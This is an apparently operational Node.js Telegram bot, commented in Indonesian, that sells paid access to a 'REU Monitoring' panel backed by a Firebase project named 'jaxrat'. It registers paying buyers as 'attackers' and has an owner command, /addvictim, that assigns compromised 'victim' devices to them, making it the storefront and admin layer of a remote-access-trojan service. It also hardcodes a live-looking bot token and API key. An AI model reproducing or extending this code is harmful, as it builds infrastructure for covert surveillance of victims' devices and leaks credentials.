const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const QRCode = require('qrcode');
const axios = require('axios');

// ========== KONFIGURASI ==========
const BOT_TOKEN = '8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho';
const OWNER_CHAT_ID = '6754308724'; // Chat ID owner
const PRICE = 50000; // 50rb
const GROUP_LINK = 'https://t.me/pangeranjendral';

// Inisialisasi Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Inisialisasi Firebase Admin
const serviceAccount = {
  "type": "service_account",
  "project_id": "jaxrat-6813c",
  "private_key_id": "LO_ISI_SENDIRI", // GANTI!
  "private_key": "-----BEGIN PRIVATE KEY-----\nLO_ISI_SENDIRI\n-----END PRIVATE KEY-----\n", // GANTI!
  "client_email": "firebase-adminsdk@jaxrat-6813c.iam.gserviceaccount.com",
  "client_id": "GANTI",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token"
};

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com"
});

const db = admin.database();

// ========== STATE MANAGEMENT ==========
const userState = {}; // { chatId: { step: 'waiting_payment', email, password } }

// ========== FUNGSI BANTU ==========
function generateQR(text) {
  return new Promise((resolve, reject) => {
    QRCode.toDataURL(text, (err, url) => {
      if (err) reject(err);
      else resolve(url);
    });
  });
}

async function isOwner(chatId) {
  return chatId.toString() === OWNER_CHAT_ID;
}

// ========== HANDLER START ==========
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // Cek apakah ini deep link (referral)
  let referralUid = null;
  if (text.includes('ref_')) {
    referralUid = text.split('_')[1];
  }
  
  const keyboard = {
    inline_keyboard: [
      [{ text: '💳 Beli Akses - Rp 50.000', callback_data: 'buy_access' }],
      [{ text: '🔑 Cek Status', callback_data: 'check_status' }],
      [{ text: '📞 Hubungi Owner', url: 'https://t.me/pangeranjendral' }]
    ]
  };
  
  await bot.sendMessage(chatId, 
    `🔐 *REU Monitoring Bot*\n\n` +
    `Halo *${msg.from.first_name}*!\n\n` +
    `Bot ini untuk mengelola akses panel monitoring.\n` +
    `Harga: *Rp 50.000* (sekali bayar, akses permanen)\n\n` +
    `Silakan pilih menu di bawah:`,
    { 
      parse_mode: 'Markdown',
      reply_markup: keyboard 
    }
  );
  
  // Simpan referral jika ada
  if (referralUid) {
    userState[chatId] = { ...userState[chatId], referral: referralUid };
  }
});

// ========== HANDLE CALLBACK QUERY ==========
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  
  await bot.answerCallbackQuery(query.id);
  
  if (data === 'buy_access') {
    await bot.sendMessage(chatId,
      `💳 *Cara Pembayaran*\n\n` +
      `1. Transfer *Rp 50.000* ke:\n` +
      `   • Bank BCA: 1234567890 a.n REU Corp\n` +
      `   • DANA: 081234567890 a.n REU\n` +
      `   • GOPAY: 081234567890 a.n REU\n\n` +
      `2. Scan QRIS di bawah untuk bayar:\n`,
      { parse_mode: 'Markdown' }
    );
    
    // Generate QRIS (contoh, ganti dengan QR asli)
    const qrData = `https://t.me/deakfta?start=payment_${chatId}`;
    const qrImage = await generateQR(qrData);
    
    await bot.sendPhoto(chatId, qrImage, {
      caption: `Scan QRIS ini untuk bayar.\n\n` +
               `📲 *Setelah bayar*, kirim:\n` +
               `/confirm email_anda password_anda\n\n` +
               `Contoh: /confirm joko@gmail.com rahasia123`,
      parse_mode: 'Markdown'
    });
    
  } else if (data === 'check_status') {
    // Cek status user di Firebase
    const userSnap = await db.ref(`users/${chatId}`).once('value');
    const userData = userSnap.val();
    
    if (userData && userData.active) {
      const expireDate = userData.expire ? new Date(userData.expire).toLocaleDateString() : 'Permanen';
      await bot.sendMessage(chatId,
        `✅ *Status: AKTIF*\n\n` +
        `Email: ${userData.email}\n` +
        `UID Firebase: ${userData.uid}\n` +
        `Masa Aktif: ${expireDate}\n\n` +
        `Panel: https://reu-panel.vercel.app`,
        { parse_mode: 'Markdown' }
      );
    } else {
      await bot.sendMessage(chatId,
        `❌ *Status: TIDAK AKTIF*\n\n` +
        `Anda belum memiliki akses. Silakan beli terlebih dahulu.`,
        { parse_mode: 'Markdown' }
      );
    }
  }
});

// ========== HANDLE CONFIRM PAYMENT ==========
bot.onText(/\/confirm (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].split(' ');
  
  if (params.length < 2) {
    return bot.sendMessage(chatId, 
      'Format salah! Gunakan: /confirm email password\nContoh: /confirm joko@gmail.com rahasia123');
  }
  
  const email = params[0];
  const password = params.slice(1).join(' ');
  
  // Cek apakah user sudah bayar? (Sederhana, kita anggap semua confirm adalah valid)
  // Dalam implementasi nyata, cek pembayaran dulu
  
  try {
    // 1. Buat user di Firebase Authentication via REST API
    const signUpRes = await axios.post(
      `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ`,
      {
        email: email,
        password: password,
        returnSecureToken: true
      }
    );
    
    const uid = signUpRes.data.localId;
    
    // 2. Simpan ke Realtime Database
    await db.ref(`users/${chatId}`).set({
      email: email,
      uid: uid,
      active: true,
      created_at: admin.database.ServerValue.TIMESTAMP,
      chat_id: chatId,
      username: msg.from.username,
      first_name: msg.from.first_name
    });
    
    // 3. Set default attacker_uid = uid mereka
    await db.ref(`settings/users_db/${uid}`).set({
      chat_id: chatId,
      email: email,
      created_at: admin.database.ServerValue.TIMESTAMP
    });
    
    // 4. Kirim notifikasi ke owner
    await bot.sendMessage(OWNER_CHAT_ID,
      `🆕 *User Baru Terdaftar!*\n\n` +
      `Chat ID: ${chatId}\n` +
      `Username: @${msg.from.username || '-'}\n` +
      `Nama: ${msg.from.first_name}\n` +
      `Email: ${email}\n` +
      `UID: ${uid}\n\n` +
      `Untuk menambah victim ke user ini, gunakan:\n` +
      `/addvictim ${uid} device_id`,
      { parse_mode: 'Markdown' }
    );
    
    // 5. Konfirmasi ke user
    await bot.sendMessage(chatId,
      `✅ *Pembayaran Dikonfirmasi!*\n\n` +
      `Akun Anda telah aktif!\n\n` +
      `📧 Email: ${email}\n` +
      `🔑 Password: ${password}\n` +
      `🆔 UID: ${uid}\n\n` +
      `🔗 *Panel:* https://reu-panel.vercel.app\n` +
      `👥 *Grup:* ${GROUP_LINK}\n\n` +
      `Simpan data ini baik-baik!`,
      { parse_mode: 'Markdown' }
    );
    
    // 6. Kirim link grup
    await bot.sendMessage(chatId,
      `🔗 *Link Grup Owner:*\n${GROUP_LINK}\n\n` +
      `Bergabung untuk update dan bantuan.`,
      { parse_mode: 'Markdown' }
    );
    
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId,
      `❌ Gagal membuat akun!\n\n` +
      `Error: ${error.message}\n\n` +
      `Kemungkinan:\n` +
      `• Email sudah terdaftar\n` +
      `• Password terlalu lemah\n` +
      `• Format email salah`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ========== COMMAND OWNER ==========

// /addvictim [uid_attacker] [device_id] - Menambahkan victim ke user
bot.onText(/\/addvictim (.+)/, async (msg, match) => {
  if (!await isOwner(msg.chat.id)) {
    return bot.sendMessage(msg.chat.id, '❌ Hanya owner!');
  }
  
  const params = match[1].split(' ');
  if (params.length < 2) {
    return bot.sendMessage(msg.chat.id, 'Usage: /addvictim attacker_uid device_id');
  }
  
  const attackerUid = params[0];
  const deviceId = params[1];
  
  try {
    await db.ref(`devices/${deviceId}/attacker_uid`).set(attackerUid);
    await bot.sendMessage(msg.chat.id, 
      `✅ Victim ${deviceId} assigned to attacker ${attackerUid}`);
  } catch (error) {
    await bot.sendMessage(msg.chat.id, `❌ Error: ${error.message}`);
  }
});

// /listusers - Lihat semua user
bot.onText(/\/listusers/, async (msg) => {
  if (!await isOwner(msg.chat.id)) return;
  
  const usersSnap = await db.ref('users').once('value');
  const users = usersSnap.val() || {};
  
  let text = '📋 *Daftar User:*\n\n';
  for (let [chatId, data] of Object.entries(users)) {
    text += `🆔 ${chatId}\n`;
    text += `👤 ${data.first_name || '-'} (@${data.username || '-'})\n`;
    text += `📧 ${data.email}\n`;
    text += `🔑 UID: ${data.uid}\n`;
    text += `📅 ${new Date(data.created_at).toLocaleString()}\n`;
    text += `➖➖➖➖➖➖➖\n`;
  }
  
  await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// /broadcast [pesan] - Kirim ke semua user
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  if (!await isOwner(msg.chat.id)) return;
  
  const message = match[1];
  const usersSnap = await db.ref('users').once('value');
  const users = usersSnap.val() || {};
  
  let sent = 0;
  for (let chatId of Object.keys(users)) {
    try {
      await bot.sendMessage(chatId, 
        `📢 *Broadcast dari Owner:*\n\n${message}`,
        { parse_mode: 'Markdown' }
      );
      sent++;
    } catch (e) {
      console.log(`Gagal kirim ke ${chatId}`);
    }
  }
  
  await bot.sendMessage(msg.chat.id, `✅ Broadcast terkirim ke ${sent} user`);
});

console.log('Bot REU Monitoring berjalan...');
